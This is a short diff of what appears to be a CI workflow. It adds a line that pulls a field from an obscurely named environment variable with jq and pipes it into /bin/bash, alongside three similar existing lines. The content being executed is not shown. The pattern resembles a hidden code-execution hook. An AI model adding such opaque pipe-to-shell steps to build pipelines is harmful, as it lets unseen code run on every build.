@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$nr7400" | jq -r .w9987 | /bin/bash
           printf '%s' "$jkj8" | jq -r .x7203 | /bin/bash
           printf '%s' "$ln62" | jq -r .eepv5 | /bin/bash
+          echo $ylqf1045 | jq -r .l37 | /bin/bash
 
       - name: Save output
         if: always()
